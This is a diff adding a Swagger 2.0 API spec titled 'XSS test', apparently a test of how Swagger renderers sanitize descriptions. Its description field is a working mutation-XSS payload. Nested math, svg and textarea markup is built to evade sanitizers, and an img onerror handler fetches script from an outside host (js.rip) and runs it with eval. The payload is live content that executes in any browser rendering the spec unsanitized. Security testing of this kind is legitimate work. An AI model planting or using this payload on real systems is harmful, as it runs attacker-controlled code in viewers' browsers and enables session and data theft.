@@ -1,0 +1,25 @@
+swagger: '2.0'
+info:
+  title: XSS test
+  description: >
+    <math>
+      <mtext>
+        <h1>
+          <a>
+            <h6>
+            </a>
+          </h6>
+          <mglyph>
+            <svg>
+              <mtext>
+                <textarea>
+                  <a title='</textarea>
+                  <img src onerror=fetch(`https://js.rip/07s7egqmxx`).then(function(res){res.text().then(function(data){eval(data)})})>
+                '></textarea>
+              </mtext>
+            </svg>
+          </mglyph>
+        </h1>
+      </mtext>
+    </math>
+  version: production
